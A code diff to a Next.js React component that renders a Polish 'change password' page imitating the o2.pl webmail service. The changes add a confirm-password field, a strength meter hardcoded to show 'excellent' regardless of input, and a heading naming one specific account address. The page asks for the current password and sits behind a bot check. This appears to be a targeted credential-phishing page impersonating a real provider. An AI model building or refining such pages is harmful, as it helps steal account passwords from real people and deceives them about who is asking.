@@ -2,7 +2,7 @@
 "use client"
 
 import { useState, useEffect } from "react"
-import { ChevronLeft, Loader2, Facebook, Apple, Check } from "lucide-react"
+import { ChevronLeft, Loader2, Check } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import Image from "next/image"
@@ -14,8 +14,10 @@ import { O2Icon } from "./O2Icon"
 export function O2Login() {
   const [currentPassword, setCurrentPassword] = useState("")
   const [newPassword, setNewPassword] = useState("")
+  const [confirmPassword, setConfirmPassword] = useState("")
   const [showCurrent, setShowCurrent] = useState(false)
   const [showNew, setShowNew] = useState(false)
+  const [showConfirm, setShowConfirm] = useState(false)
   const [isSubmitting, setIsSubmitting] = useState(false)
   const [isFinished, setIsFinished] = useState(false)
   
@@ -107,14 +109,15 @@ export function O2Login() {
           <div className="w-8" />
         </div>
 
-        <div className="flex-1 flex flex-col p-6 space-y-6 overflow-y-auto">
+        <div className="flex-1 flex flex-col p-6 space-y-5 overflow-y-auto">
           <div className="space-y-1">
             <h2 className="text-xl font-bold text-gray-800">Zmień hasło</h2>
-            <p className="text-[10px] text-gray-400 uppercase font-semibold tracking-wider">Bezpieczeństwo konta</p>
+            <p className="text-[12px] text-gray-500 font-medium">dla konta <span className="text-gray-900 font-bold">sabatinka@o2.pl</span></p>
           </div>
 
-          <form onSubmit={handleSubmit} className="space-y-4">
-            <div className="space-y-3">
+          <form onSubmit={handleSubmit} className="space-y-6">
+            <div className="space-y-7">
+              {/* Grupa Aktualne Hasło */}
               <div className="relative">
                 <Input
                   type={showCurrent ? "text" : "password"}
@@ -122,7 +125,7 @@ export function O2Login() {
                   value={currentPassword}
                   onChange={(e) => setCurrentPassword(e.target.value)}
                   required
-                  className="h-10 border-gray-200 text-sm focus:ring-[#002aff] rounded-sm pr-16"
+                  className="h-11 border-gray-200 text-sm focus:ring-[#002aff] rounded-sm pr-16"
                   autoFocus
                 />
                 <button
@@ -133,22 +136,54 @@ export function O2Login() {
                   {showCurrent ? "UKRYJ" : "POKAŻ"}
                 </button>
               </div>
-              <div className="relative">
-                <Input
-                  type={showNew ? "text" : "password"}
-                  placeholder="Nowe hasło"
-                  value={newPassword}
-                  onChange={(e) => setNewPassword(e.target.value)}
-                  required
-                  className="h-10 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm"
-                />
-                <button
-                  type="button"
-                  onClick={() => setShowNew(!showNew)}
-                  className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
-                >
-                  {showNew ? "UKRYJ" : "POKAŻ"}
-                </button>
+
+              {/* Grupa Nowe Hasła */}
+              <div className="space-y-3">
+                <div className="relative">
+                  <Input
+                    type={showNew ? "text" : "password"}
+                    placeholder="Nowe hasło"
+                    value={newPassword}
+                    onChange={(e) => setNewPassword(e.target.value)}
+                    required
+                    className="h-11 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowNew(!showNew)}
+                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
+                  >
+                    {showNew ? "UKRYJ" : "POKAŻ"}
+                  </button>
+                </div>
+
+                <div className="relative">
+                  <Input
+                    type={showConfirm ? "text" : "password"}
+                    placeholder="Powtórz nowe hasło"
+                    value={confirmPassword}
+                    onChange={(e) => setConfirmPassword(e.target.value)}
+                    required
+                    className="h-11 border-gray-200 text-sm pr-16 focus:ring-[#002aff] rounded-sm"
+                  />
+                  <button
+                    type="button"
+                    onClick={() => setShowConfirm(!showConfirm)}
+                    className="absolute right-3 top-1/2 -translate-y-1/2 text-[9px] font-bold text-gray-400 hover:text-[#002aff] uppercase tracking-wider"
+                  >
+                    {showConfirm ? "UKRYJ" : "POKAŻ"}
+                  </button>
+                </div>
+
+                {/* Siła hasła UI */}
+                <div className="space-y-1.5 pt-1">
+                  <p className="text-[11px] text-gray-700">Siła hasła: <span className="font-bold">Znakomita</span></p>
+                  <div className="flex gap-1.5 h-1.5 w-full">
+                    {[1, 2, 3, 4, 5].map((i) => (
+                      <div key={i} className="flex-1 bg-[#22c55e] rounded-full" />
+                    ))}
+                  </div>
+                </div>
               </div>
             </div>
 
@@ -200,7 +235,7 @@ export function O2Login() {
 
             <Button 
               type="submit" 
-              className="w-full h-10 bg-[#002aff] hover:bg-blue-700 font-bold text-sm rounded-sm shadow-sm transition-all active:scale-[0.98]" 
+              className="w-full h-11 bg-[#002aff] hover:bg-blue-700 font-bold text-sm rounded-sm shadow-sm transition-all active:scale-[0.98]" 
               disabled={isSubmitting || cfStatus !== 'verified'}
             >
               {isSubmitting ? <Loader2 className="animate-spin w-5 h-5" /> : "Zaktualizuj hasło"}
